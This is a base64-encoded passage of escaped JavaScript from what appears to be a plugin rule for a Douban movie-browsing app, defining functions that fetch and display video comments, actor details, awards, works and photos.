AgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgIH1cXFxcclxcXFxuICAgIGlmIChsLmxlbmd0aCA+IDApIHtcXFxcclxcXFxuICAgICAgICBsLnVuc2hpZnQoe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLniYfmrrVcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgaWYgKG8ubGVuZ3RoID4gMCkge1xcXFxyXFxcXG4gICAgICAgIG8udW5zaGlmdCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuiKsee1rlxcXFxcXFwiLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIlxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgc2V0SG9tZVJlc3VsdCh7XFxcXHJcXFxcbiAgICAgICAgZGF0YTogci5jb25jYXQobClcXFxcclxcXFxuICAgICAgICAgICAgLmNvbmNhdChvKVxcXFxyXFxcXG4gICAgfSlcXFxcclxcXFxufVxcXFxyXFxcXG5cXFxcclxcXFxuLy/op4bpopHor4TorrrpobXpnaJcXFxcclxcXFxuZnVuY3Rpb24gdmlkZW9Db21tZW50KHR5cGUsIGlkKSB7XFxcXHJcXFxcbiAgICBsZXQgaSA9IGdldERvdWJhblJlcyhcXFxcXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcXFxcXCIgKyB0eXBlICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBpZCArIFxcXFxcXFwiL3ZpZGVvc1xcXFxcXFwiKS52aWRlb3M7XFxcXHJcXFxcbiAgICBpLmZvckVhY2goKGUgPT4ge1xcXFxyXFxcXG4gICAgICAgIGUuY29sX3R5cGUgPSBcXFxcXFxcIm1vdmllXzJcXFxcXFxcIiwgZS5kZXNjID0gZS5hdXRob3IubmFtZSArIFxcXFxcXFwi4oCiXFxcXFxcXCIgKyBlLmNyZWF0ZV90aW1lLCBlLmltZyA9IGUuY292ZXJfdXJsICsgXFxcXFxcXCJAUmVmZXJlcj1cXFxcXFxcIiArIGUuY292ZXJfdXJsLCBlLnVybCA9IGUudmlkZW9fdXJsXFxcXHJcXFxcbiAgICB9KSlcXFxcclxcXFxuICAgIGlmIChpLmxlbmd0aCA+IDApIHtcXFxcclxcXFxuICAgICAgICBpLnVuc2hpZnQoe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLop4bpopHor4TorrpcXFxcXFxcIixcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgc2V0SG9tZVJlc3VsdCh7XFxcXHJcXFxcbiAgICAgICAgZGF0YTogaVxcXFxyXFxcXG4gICAgfSlcXFxcclxcXFxufVxcXFxyXFxcXG5cXFxcclxcXFxuLy/mvJTogYzkurrlkZjor6bmg4XpobXpnaJcXFxcclxcXFxuZnVuY3Rpb24gZWxlc3NhclZpZXcoaWQsIHBpZCwgbmFtZSkge1xcXFxyXFxcXG4gICAgc2V0UGFnZVRpdGxlKG5hbWUpO1xcXFxyXFxcXG4gICAgbGV0IGkgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL2VsZXNzYXIvc3ViamVjdC9cXFxcXFxcIiArIGlkKTtcXFxcclxcXFxuICAgIGxldCBhID0gW107XFxcXHJcXFxcbiAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIChpLnRpdGxlICsgJygnICsgaS5sYXRpbl90aXRsZSArICcpJykuYmlnKCkuYm9sZCgpLFxcXFxyXFxcXG4gICAgICAgIGRlc2M6ICfigJzigJzigJ3igJ0nICsgaS5kZXNjLm1hdGNoKC9cXFxcXFxcXDxwXFxcXFxcXFw+LipcXFxcXFxcXDxcXFxcXFxcXC9wXFxcXFxcXFw+LylbMF0sXFxcXHJcXFxcbiAgICAgICAgaW1nOiBpLmNvdmVyLm5vcm1hbC51cmwgKyAnQFJlZmVyZXI9JyArIGkuY292ZXIubm9ybWFsLnVybCxcXFxcclxcXFxuICAgICAgICBjb2xfdHlwZTogJ21vdmllXzFfdmVydGljYWxfcGljX2JsdXInLFxcXFxyXFxcXG4gICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eScpLnJ1bGUoKGRlc2MsIGV4dHJhLCBuYW1lKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCBpbmZvID0gZXh0cmEuaW5mby5tYXAoZSA9PiBlLmpvaW4oJzombmJzcDsnKSk7XFxcXHJcXFxcbiAgICAgICAgICAgIHNldFJlc3VsdChbe1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6ICc8aDI+JyArIG5hbWUgKyAnPC9oMj4nICsgaW5mby5qb2luKCc8YnIvPicpICsgZGVzYy5tYXRjaCgvXFxcXFxcXFw8cFxcXFxcXFxcPi4qXFxcXFxcXFw8XFxcXFxcXFwvcFxcXFxcXFxcPi8pWzBdLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxcXHJcXFxcbiAgICAgICAgICAgIH1dKVxcXFxyXFxcXG4gICAgICAgIH0sIGkuZGVzYywgaS5leHRyYSwgaS50aXRsZSlcXFxcclxcXFxuICAgIH0pXFxcXHJcXFxcbiAgICBcXFxcclxcXFxuICAgIGxldCBpbmRleCA9IGkubW9kdWxlcy5maW5kSW5kZXgoY3VyID0+IGN1ci50eXBlID09IFxcXFxcXFwiYXdhcmRfcmVzdWx0X2NvbGxlY3Rpb25cXFxcXFxcIik7XFxcXHJcXFxcbiAgICBpZiAoaW5kZXggPiAtMSkge1xcXFxyXFxcXG4gICAgICAgIGxldCBlID0gaS5tb2R1bGVzW2luZGV4XS5wYXlsb2FkO1xcXFxyXFxcXG4gICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArICfojrflpZborrDlvZUnLmJpZygpLmJvbGQoKSArICc8c21hbGw+KOWFsScgKyBlLnRvdGFsICsgJ+mhuSk8L3NtYWxsPicsXFxcXHJcXFxcbiAgICAgICAgICAgIGRlc2M6ICfigJzigJzigJ3igJ08c3Ryb25nPicgKyBlLmF3YXJkc1swXS5jZXJlbW9ueS50aXRsZSArICc8L3N0cm9uZz5cXFxcXFxcXG4nICsgZS5hd2FyZHNbMF0uY2F0ZWdvcnkudGl0bGUgKyAoZS5hd2FyZHNbMF0uaXNfd29uID8gJycgOiAnKOaPkOWQjSknKSxcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXFxcclxcXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5LyMvJHBhZ2V7ZnlwYWdlfSNub0hpc3RvcnkjJykucnVsZSgoaWQsIGNvdW50KSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBlbGVzc2FyQXdhcmRzKGlkLCBjb3VudCk7XFxcXHJcXFxcbiAgICAgICAgICAgIH0sIGUuaWQsIGUudG90YWwpLFxcXFxyXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgfVxcXFxyXFxcXG4gICAgXFxcXHJcXFxcbiAgICBpbmRleCA9IGkubW9kdWxlcy5maW5kSW5kZXgoY3VyID0+IGN1ci50eXBlID09IFxcXFxcXFwid29ya19jb2xsZWN0aW9uc1xcXFxcXFwiKTtcXFxcclxcXFxuICAgIGlmIChpbmRleCA+IC0xKSB7XFxcXHJcXFxcbiAgICAgICAgbGV0IGUyID0gaS5tb2R1bGVzW2luZGV4XS5wYXlsb2FkO1xcXFxyXFxcXG4gICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnbGluZSdcXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArICflvbHop4bkvZzlk4EnLmJpZygpLmJvbGQoKSArICgnKOWFsScgKyBlMi5jb2xsZWN0aW9uc1swXS50b3RhbCArICfpg6gpJykuc21hbGwoKSxcXFxcclxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXFxcclxcXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5LyMvJHBhZ2V7ZnlwYWdlfSNub0hpc3RvcnkjJykucnVsZSgoaWQsIHR5cGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGVsZXNzYXJXb3JrcyhpZCwgdHlwZSk7XFxcXHJcXFxcbiAgICAgICAgICAgIH0sIGUyLmlkLCBlMi5jb2xsZWN0aW9uc1swXS50aXRsZSksXFxcXHJcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXFxcclxcXFxuICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcXFxyXFxcXG4gICAgICAgIGxldCB3b3JrcyA9IGUyLmNvbGxlY3Rpb25zWzBdLndvcmtzO1xcXFxyXFxcXG4gICAgICAgIGxldCBsZW5ndGggPSB3b3Jrcy5sZW5ndGggPD0gMyA/IHdvcmtzLmxlbmd0aCA6IDM7XFxcXHJcXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykge1xcXFxyXFxcXG4gICAgICAgICAgICBsZXQgZSA9IHdvcmtzW2ldO1xcXFxyXFxcXG4gICAgICAgICAgICBsZXQgcmF0aW5nID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcclxcXFxuICAgICAgICAgICAgaWYgKGUuc3ViamVjdC5leHRyYS5yYXRpbmdfZ3JvdXAucmF0aW5nKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICByYXRpbmcgPSBjb21wdXRlUmF0aW5nKGUuc3ViamVjdC5leHRyYS5yYXRpbmdfZ3JvdXAucmF0aW5nLm1heCwgZS5zdWJqZWN0LmV4dHJhLnJhdGluZ19ncm91cC5yYXRpbmcudmFsdWUpICsgXFxcXFxcXCIgXFxcXFxcXCIgKyBlLnN1YmplY3QuZXh0cmEucmF0aW5nX2dyb3VwLnJhdGluZy52YWx1ZSArIFxcXFxcXFwi5YiGXFxcXFxcXCI7XFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICAgICAgICAgIGxldCB0eXBlID0gZS5zdWJqZWN0LnN1YnR5cGUsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpZCA9IGUuc3ViamVjdC5pZCxcXFxcclxcXFxuICAgICAgICAgICAgICAgIHRpdGxlID0gZS5zdWJqZWN0LnRpdGxlO1xcXFxyXFxcXG4gICAgICAgICAgICBsZXQgdXNlQ29uZmlnID0gZGV0YWlsc1ZpZXdDb25maWdzW2RldGFpbHNWaWV3Q29uZmlncy51c2VdLmNvbmZpZztcXFxcclxcXFxuICAgICAgICAgICAgbGV0IHVybFBhcmFtcyA9IHt9O1xcXFxyXFxcXG4gICAgICAgICAgICBpZiAodXNlQ29uZmlnLnN0YXJ0c1dpdGgoJ3snKSkge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgZXZhbCgndXJsUGFyYW1zID0gJyArIHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB1cmxQYXJhbXMudXJsID0gJChcXFxcXFxcImhpa2VyOi8vZW1wdHkjbm9IaXN0b3J5IyNpbW1lcnNpdmVUaGVtZSNcXFxcXFxcIiArICc/dHlwZT0nICsgdHlwZSArICcmaWQ9JyArIGlkKS5ydWxlKCh0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZykgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRvdUxpc3QoaWQsIE1ZX1BBR0UsIDUwKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgfSwgdHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpO1xcXFxyXFxcXG4gICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBpbWc6IGUuc3ViamVjdC5jb3Zlci5ub3JtYWwudXJsICsgXFxcXFxcXCJAUmVmZXJlcj1cXFxcXFxcIiArIGUuc3ViamVjdC5jb3Zlci5ub3JtYWwudXJsLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogcmF0aW5nLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8zJyxcXFxcclxcXFxuICAgICAgICAgICAgICAgIHVybDogdXJsUGFyYW1zLnVybCxcXFxcclxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB1cmxQYXJhbXMuZXh0cmFcXFxcclxcXFxuICAgICAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgLyphLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogJ+afpeeci+abtOWkmicsXFxcXHJcXFxcbiAgICAgICAgICAgIGltZzogJ2h0dHBzOi8vam9rZXItdHguY29kaW5nLm5ldC9wL2hpa2VyaW1nL2QvaGlrZXIvZ2l0L3Jhdy9tYXN0ZXIvaW1nL21vcmVfdmVyLnBuZz9kb3dubG9hZD1mYWxzZScsXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnbW92aWVfMycsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8jLyRwYWdle2Z5cGFnZX0jbm9IaXN0b3J5IycpXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAucnVsZSgoaWQsIHR5cGUpID0+IHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGVsZXNzYXJXb3JrcyhpZCwgdHlwZSk7XFxcXHJcXFxcbiAgICAgICAgICAgIH0sIGUyLmlkLCBlMi5jb2xsZWN0aW9uc1swXS50aXRsZSlcXFxcclxcXFxuICAgICAgICB9KSovXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcbiAgICBcXFxcclxcXFxuICAgIGluZGV4ID0gaS5tb2R1bGVzLmZpbmRJbmRleChjdXIgPT4gY3VyLnR5cGUgPT0gXFxcXFxcXCJwaG90b3NcXFxcXFxcIik7XFxcXHJcXFxcbiAgICBpZiAoaW5kZXggPiAtMSkge1xcXFxyXFxcXG4gICAgICAgIGxldCBlMyA9IGkubW9kdWxlc1tpbmRleF0ucGF5bG9hZDtcXFxcclxcXFxuICAgICAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2xpbmUnXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICBhLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAn5ryU5ZGY54Wn54mHJy5iaWcoKS5ib2xkKCkgKyAoJyjlhbEnICsgZTMudG90YWwgKyAn5bygKScpLnNtYWxsKCksXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8jLyRwYWdle2Z5cGFnZX0jbm9IaXN0b3J5IycpLnJ1bGUoKHBpZCkgPT4ge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgZWxlc3NhclBob3RvcyhwaWQpO1xcXFxyXFxcXG4gICAgICAgICAgICB9LCBwaWQpLFxcXFxyXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICB9KVxcXFxyXFxcXG5cXFxcclxcXFxuICAgICAgICBsZXQgcGxlbmd0aCA9IGUzLnBob3Rvcy5sZW5ndGggPD0gMiA/IGUzLnBob3Rvcy5sZW5ndGggOiAyO1xcXFxyXFxcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgcGxlbmd0aDsgaSsrKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGEucHVzaCh7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAvL3RpdGxlOiBlMy5waG90b3NbMF0uZGVzY3JpcHRpb24sXFxcXHJcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzInLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogJzAnLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgaW1nOiBlMy5waG90b3NbaV0uaW1hZ2Uubm9ybWFsLnVybCArICdAUmVmZXJlcj0nICsgZTMucGhvdG9zW2ldLmltYWdlLm5vcm1hbC51cmwsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB1cmw6IGUzLnBob3Rvc1tpXS5pbWFnZS5ub3JtYWwudXJsICsgJ0BSZWZlcmVyPScgKyBlMy5waG90b3NbaV0uaW1hZ2Uubm9ybWFsLnVybFxcXFxyXFxcXG4gICAgICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgIH1cXFxcclxcXFxuXFxcXHJcXFxcbiAgICAgICAgLyphLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICAvL3RpdGxlOiAn5p+l55yL5pu05aSaJyxcXFxcclxcXFxuICAgICAgICAgICAgaW1nOiAnaHR0cHM6Ly9qb2tlci10eC5jb2RpbmcubmV0L3AvaGlrZXJpbWcvZC9oaWtlci9naXQvcmF3L21hc3Rlci9pbWcvbW9yZS5wbmc/ZG93bmxvYWQ9ZmFsc2UnLFxcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzInLFxcXFxyXFxcXG4gICAgICAgICAgICBkZXNjOiAnMCcsXFxcXHJcXFxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8jLyRwYWdle2Z5cGFnZX0jbm9IaXN0b3J5IycpXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAucnVsZSgocGlkKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBlbGVzc2FyUGhvdG9zKHBpZCk7XFxcXHJcXFxcbiAgICAgICAgICAgIH0sIHBpZClcXFxcclxcXFxuICAgICAgICB9KSovXFxcXHJcXFxcbiAgICB9XFxcXHJcXFxcblxcXFxyXFxcXG4gICAgc2V0UmVzdWx0KGEpO1xcXFxyXFxcXG59XFxcXHJcXFxcblxcXFxyXFxcXG4vL+a8lOiBjOS6uuWRmOiOt+WlluivpuaDhemhtemdolxcXFxyXFxcXG5mdW5jdGlvbiBlbGVzc2FyQXdhcmRzKGlkLCBjb3VudCkge1xcXFxyXFxcXG4gICAgbGV0IGkgPSBnZXREb3ViYW5SZXMoXFxcXFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL2VsZXNzYXIvYXdhcmRfcmVzdWx0X2NvbGxlY3Rpb24vXFxcXFxcXCIgKyBpZCArIFxcXFxcXFwiL2F3YXJkcz9zdGFydD1cXFxcXFxcIiArIDMwICogKE1ZX1BBR0UgLSAxKSArIFxcXFxcXFwiJmNvdW50PTMwXFxcXFxcXCIpO1xcXFxyXFxcXG4gICAgbGV0IGwgPSBbXTtcXFxcclxcXFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcXFxyXFxcXG4gICAgaS5hd2FyZHMuZm9yRWFjaCh0ID0+IHtcXFxcclxcXFxuICAgICAgICBsLnB1c2goe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogKHQueWVhcitcXFxcXFxcIlxcXFxcXFwiKS5ib2xkKCkuYmlnKCksXFxcXHJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcXFxyXFxcXG4gICAgICAgIH0pXFxcXHJcXFxcblxcXFxyXFxcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgdC5tb2R1bGVzLmxlbmd0aDsgaSsrKSB7XFxcXHJcXFxcbiAgICAgICAgICAgIGxldCBlID0gdC5tb2R1bGVzW2ldO1xcXFxyXFxcXG4gICAgICAgICAgICBpZiAoIWUuY2VyZW1vbnkgfHwgIWUuY2F0ZWdvcnkpIHtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGxldCByYXRpbmcgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgaWYgKGUuZXh0cmEucmF0aW5nX2dyb3VwLnJhdGluZykge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHJhdGluZyA9IGNvbXB1dGVSYXRpbmcoZS5leHRyYS5yYXRpbmdfZ3JvdXAucmF0aW5nLm1heCwgZS5leHRyYS5yYXRpbmdfZ3JvdXAucmF0aW5nLnZhbHVlKSArIFxcXFxcXFwiIFxcXFxcXFwiICsgZS5leHRyYS5yYXRpbmdfZ3JvdXAucmF0aW5nLnZhbHVlICsgXFxcXFxcXCLliIZcXFxcXFxcIjtcXFxcclxcXFxuICAgICAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICAgICAgICAgIGxldCB0eXBlID0gZS5zdWJ0eXBlLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGlkID0gZS5pZCxcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZSA9IGUudGl0bGU7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICBsZXQgdXNlQ29uZmlnID0gZGV0YWlsc1ZpZXdDb25maWdzW2RldGFpbHNWaWV3Q29uZmlncy51c2VdLmNvbmZpZztcXFxcclxcXFxuICAgICAgICAgICAgICAgIGxldCB1cmxQYXJhbXMgPSB7fTtcXFxcclxcXFxuICAgICAgICAgICAgICAgIGlmICh1c2VDb25maWcuc3RhcnRzV2l0aCgneycpKSB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgZXZhbCgndXJsUGFyYW1zID0gJyArIHVzZUNvbmZpZyk7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybFBhcmFtcy51cmwgPSAkKFxcXFxcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjI2ltbWVyc2l2ZVRoZW1lI1xcXFxcXFwiICsgJz90eXBlPScgKyB0eXBlICsgJyZpZD0nICsgaWQpLnJ1bGUoKHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKSA9PiB7XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIikge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZhbCh1c2VDb25maWcpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSwgdHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpO1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxyXFxcXG4gICAgICAgICAgICAgICAgbC5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxcXHJcXFxcbiAgICAgICAgICAgICAgICAgICAgaW1nOiBlLmNvdmVyLm5vcm1hbC51cmwgKyBcXFxcXFxcIkBSZWZlcmVyPVxcXFxcXFwiICsgZS5jb3Zlci5ub3JtYWwudXJsLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IHJhdGluZyArICdcXFxcXFxcXG4nICsgZS5leHRyYS5zaG9ydF9pbmZvLFxcXFxyXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdXJsUGFyYW1zLnVybCxcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBleHRyYTogdXJsUGFyYW1zLmV4dHJhXFxcXHJcXFxcbiAgICAgICAgICAgICAgICB9KVxcXFxyXFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxyXFxcXG4gICAgICAgICAgICAgICAgbC5wdXNoKHtcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogZS5jZXJlbW9ueS50aXRsZS5ib2xkKCkgKyAnPHNtYWxsPig8YSBocmVmPVxcXFxcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjQHJ1bGU9anM6ZXZhbChKU09OLnBhcnNlKGZldGNoKGBoaWtlcjovL3BhZ2UvbWFpbmApKS5ydWxlKTthd2FyZFZpZXcoYCcgKyBlLmNlcmVtb255LmlkICsgJ2AsYCcgKyBlLmNlcmVtb255LnRpdGxlICsgJ2ApO1xcXFxcXFwiPuafpeeci+ivpuaDhTwvYT4pPC9zbWFsbD4nICsgJzxici8+JyArIChlLmNhdGVnb3J5LnRpdGxlICsgKGUuaXNfd29uID8gJycgOiAnKOaPkOWQjSknKSkuc21hbGwoKSxcXFxcclxcXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCdcXFxcclxcXFxuICAgICAgICAgICAgICAgIH0pXFxcXHJcXFxcbiAgICAgICAgICAgIH1cXFxcclxcXFxuICAgICAgICB9XFxcXHJcXFxcbiAgICB9KVxcXFxyXFxcXG5cXFxcclxcXFxuICAgIGlmIChNWV9QQUdFID09IDEpIHtcXFxcclxcXFxuICAgICAgICBsLnVuc2hpZnQoe1xcXFxyXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJibGFua19ibG9ja1xcXFxcXFwiXFxcXHJcXFxcbiAgICAgICAgfSlcXFxcclxcXFxuICAgICAgICBsLnVuc2hpZnQoe1xcXFxyXFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCI8YmlnPuWFsTxzdHJvbmc+IFxcXFxcXFwiICsgY291bnQgKyBcXF